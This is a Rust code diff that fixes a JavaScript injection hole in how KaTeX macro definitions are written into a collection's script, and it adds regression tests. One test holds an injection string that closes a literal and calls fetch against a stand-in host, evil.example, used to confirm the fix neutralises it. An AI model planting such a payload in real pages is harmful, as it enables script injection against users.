@@ -17,6 +17,9 @@
 use std::fmt::Display;
 use std::fmt::Formatter;
 
+use serde_json::Map;
+use serde_json::Value;
+
 /// Which rating buttons a card's answer shows.
 ///
 /// Set per deployment by `[defaults].answer_controls` in the config file.
@@ -37,12 +40,20 @@ impl Display for AnswerControls {
     }
 }
 
-/// Escape a string for interpolation into a single-quoted JavaScript
-/// literal in the generated KaTeX macro script.
-pub fn escape_js_string_literal(s: &str) -> String {
-    s.replace('\\', "\\\\")
-        .replace('`', "\\`")
-        .replace('$', "\\$")
+/// Render the `MACROS` declaration prepended to a collection's `script.js`.
+///
+/// Macro names and definitions come from a collection's `macros.tex`, so
+/// they are user input. They are emitted as a JSON object literal — JSON
+/// is a subset of JavaScript expression syntax — rather than pasted into
+/// hand-quoted string literals: an apostrophe in a definition (`\text{don't}`)
+/// used to close the literal early, which broke the whole script and let a
+/// crafted definition inject arbitrary JavaScript into the page.
+pub fn render_macros_declaration(macros: &[(String, String)]) -> String {
+    let map: Map<String, Value> = macros
+        .iter()
+        .map(|(name, definition)| (name.clone(), Value::String(definition.clone())))
+        .collect();
+    format!("let MACROS = {};\n", Value::Object(map))
 }
 
 #[cfg(test)]
@@ -55,10 +66,60 @@ mod tests {
         assert_eq!(AnswerControls::Binary.to_string(), "binary");
     }
 
+    /// The declaration must be a single JavaScript statement whose right-hand
+    /// side parses as JSON, whatever the macros contain.
+    fn parse_declaration(rendered: &str) -> Value {
+        let body = rendered
+            .strip_prefix("let MACROS = ")
+            .and_then(|s| s.strip_suffix(";\n"))
+            .expect("the declaration must be `let MACROS = <object>;`");
+        serde_json::from_str(body).expect("the right-hand side must be valid JSON")
+    }
+
     #[test]
-    fn test_escape_js_string_literal() {
-        assert_eq!(escape_js_string_literal(r"\alpha"), r"\\alpha");
-        assert_eq!(escape_js_string_literal("a`b"), "a\\`b");
-        assert_eq!(escape_js_string_literal("$x$"), "\\$x\\$");
+    fn test_render_macros_declaration_is_empty_object_for_no_macros() {
+        assert_eq!(render_macros_declaration(&[]), "let MACROS = {};\n");
+    }
+
+    #[test]
+    fn test_render_macros_declaration_preserves_backslashes() {
+        let macros = vec![(r"\R".to_string(), r"\mathbb{R}".to_string())];
+        let value = parse_declaration(&render_macros_declaration(&macros));
+        assert_eq!(value[r"\R"], Value::String(r"\mathbb{R}".to_string()));
+    }
+
+    /// An apostrophe in a definition used to close the single-quoted literal
+    /// the macro was pasted into, breaking every script on the page.
+    #[test]
+    fn test_render_macros_declaration_survives_apostrophes() {
+        let macros = vec![(r"\dont".to_string(), r"\text{don't}".to_string())];
+        let rendered = render_macros_declaration(&macros);
+        let value = parse_declaration(&rendered);
+        assert_eq!(value[r"\dont"], Value::String(r"\text{don't}".to_string()));
+    }
+
+    /// A definition can otherwise close the declaration and append statements
+    /// of its own.
+    #[test]
+    fn test_render_macros_declaration_survives_injection_attempt() {
+        let macros = vec![(
+            r"\x".to_string(),
+            "'; fetch('https://evil.example'); //".to_string(),
+        )];
+        let rendered = render_macros_declaration(&macros);
+        let value = parse_declaration(&rendered);
+        assert_eq!(
+            value[r"\x"],
+            Value::String("'; fetch('https://evil.example'); //".to_string())
+        );
+    }
+
+    #[test]
+    fn test_render_macros_declaration_escapes_quotes_and_newlines() {
+        let macros = vec![(r"\q".to_string(), "a\"b\nc".to_string())];
+        let rendered = render_macros_declaration(&macros);
+        assert_eq!(rendered.lines().count(), 1, "the declaration is one line");
+        let value = parse_declaration(&rendered);
+        assert_eq!(value[r"\q"], Value::String("a\"b\nc".to_string()));
     }
 }
